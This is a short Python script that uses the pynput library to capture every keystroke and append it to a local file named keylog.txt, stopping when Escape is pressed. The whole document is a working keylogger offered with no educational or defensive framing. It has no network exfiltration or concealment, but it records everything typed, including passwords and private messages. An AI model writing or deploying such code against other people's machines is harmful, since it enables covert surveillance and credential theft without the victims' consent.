from pynput import keyboard

# Specify the log file where keystrokes will be saved
log_file = "keylog.txt"

# This function will handle the keypress events and log them
def on_press(key):
    try:
        # Log alphanumeric characters
        with open(log_file, "a") as log:
            log.write(str(key.char))
    except AttributeError:
        # Log special keys like space, enter, etc.
        with open(log_file, "a") as log:
            if key == keyboard.Key.space:
                log.write(" ")
            elif key == keyboard.Key.enter:
                log.write("\n")
            else:
                log.write(f" [{key}] ")

# This function will handle the key release events (optional)
def on_release(key):
    # Stop logging if the escape key is pressed (optional for testing)
    if key == keyboard.Key.esc:
        return False

# Start listening for keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()